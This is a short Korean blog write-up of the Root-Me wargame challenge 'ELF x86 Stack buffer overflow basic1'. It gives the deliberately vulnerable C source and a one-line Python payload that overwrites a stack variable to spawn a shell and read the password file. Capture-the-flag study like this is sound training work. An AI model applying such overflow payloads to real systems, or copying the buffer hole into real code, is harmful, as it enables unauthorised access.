---
title: "[Root-Me] ELF x86-Stack buffer overflow basic1"
excerpt: ""
categories: 
  - Wargame
tags: 
  - system
  - root-me
last_modified_at: 2018-07-08T22:35:00+09:00
---

## 문제
```c
#include <stdlib.h>
#include <stdio.h>
 
/*
gcc -m32 -o ch13 ch13.c -fno-stack-protector
*/
 
 
int main()
{
 
  int var;
  int check = 0x04030201;
  char buf[40];
 
  fgets(buf,45,stdin);
 
  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);
 
  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");
 
  if (check == 0xdeadbeef)
   {
     printf("Yeah dude! You win!\nOpening your shell...\n");
     system("/bin/dash");
     printf("Shell closed! Bye.\n");
   }
   return 0;
}
```

간만에 풀어보는 BOF 문제라 가물가물하면서 풀었던 문제.

버퍼를 채워주고 check 부분을 덮어씌워 주니 해결


## 풀이
```
app-systeme-ch13@challenge02:~$ (python -c 'print "a"*40+"\xef\xbe\xad\xde\n"';cat) | ./ch13

[buf]: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaﾭÞ
[check] 0xdeadbeef
Yeah dude! You win!
Opening your shell...
cat .passwd

```